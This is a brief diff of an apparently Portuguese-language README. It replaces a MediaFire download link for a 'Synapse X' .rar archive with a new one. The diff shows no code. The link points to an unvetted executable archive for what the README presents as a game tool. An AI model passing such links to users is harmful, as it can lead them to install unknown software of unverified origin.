@@ -41,6 +41,6 @@ FAÇA ASSIM IGUAL ESTÁ NA IMAGEM : ![download](https://user-images.githubuserco
   
 <br>
 <br><br>
-💸 <b>• DOWNLOAD DO SYNAPSE - X:</b> https://www.mediafire.com/file/a85qqtnc3k7kp32/Synapse+X.rar/file/file
+💸 <b>• DOWNLOAD DO SYNAPSE - X:</b> https://www.mediafire.com/file/px0j5pmbt7bi10v/Synapse+X.rar/file
 <br>
 <br>
